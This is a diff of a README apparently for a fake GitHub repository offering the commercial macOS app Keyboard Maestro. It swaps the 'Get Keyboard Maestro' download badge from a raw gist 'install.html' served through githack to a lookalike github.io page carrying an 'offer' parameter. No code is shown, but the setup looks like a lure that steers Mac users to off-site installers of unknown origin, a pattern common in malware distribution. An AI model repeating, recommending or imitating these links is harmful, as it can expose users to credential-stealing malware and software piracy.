@@ -3,7 +3,7 @@
 **Keyboard Maestro** is the all-in-one **automation toolkit for macOS**.  
 Create macros, bind hotkeys, schedule actions, and integrate scripts to control apps, files, and windows with astonishing speed. 🍎
 
-[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20Keyboard%20Maestro-43A047?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/gusardorogasmerti-svg/489cea489f2c037de1348b823c5f2066/raw/5b77ba2cc864789c3b9db31a7a15995d89d5c09a/install.html?offer=KeyboardMaestroMac)
+[![🟢 Get GitHub Instruction](https://img.shields.io/badge/🟢%20Get%20Keyboard%20Maestro-43A047?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=KeyboardMaestroMac)
 
 ---
 
